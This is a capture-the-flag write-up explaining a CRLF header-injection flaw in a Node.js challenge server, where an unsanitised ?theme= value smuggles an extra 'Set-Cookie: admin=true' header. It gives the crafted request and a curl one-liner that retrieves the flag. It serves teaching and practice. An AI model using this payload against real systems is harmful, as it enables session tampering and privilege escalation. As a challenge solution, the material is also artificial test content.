# Don't Lose Your Head — Writeup

## Intended Solution

The Node.js server builds HTTP responses by manually concatenating header strings.
The `?theme=` query parameter is reflected verbatim into a `Set-Cookie: theme=<value>` line
without any sanitisation, creating a **CRLF injection** vulnerability.

The admin check reads:

```js
if (headersRaw.includes('Set-Cookie: admin=true')) {
    sess.admin = true;
}
```

This check runs on the raw header string *before* it is sent, so injecting a second
`Set-Cookie` header via the `theme` parameter directly satisfies the condition.

## Exploit

Send a single HTTP request with the following crafted `theme` value (URL-encoded `\r\n`):

```
GET /?theme=dark%0d%0aSet-Cookie:%20admin=true HTTP/1.1
Host: <target>
```

The server constructs:

```
HTTP/1.1 200 OK
Set-Cookie: theme=dark
Set-Cookie: admin=true
...
```

The `headersRaw.includes('Set-Cookie: admin=true')` check matches, `sess.admin` is set to
`true`, and the response body includes the flag.

## One-liner

```bash
curl -s "http://<target>:3000/?theme=dark%0d%0aSet-Cookie:%20admin=true"
```

The flag appears in the response HTML.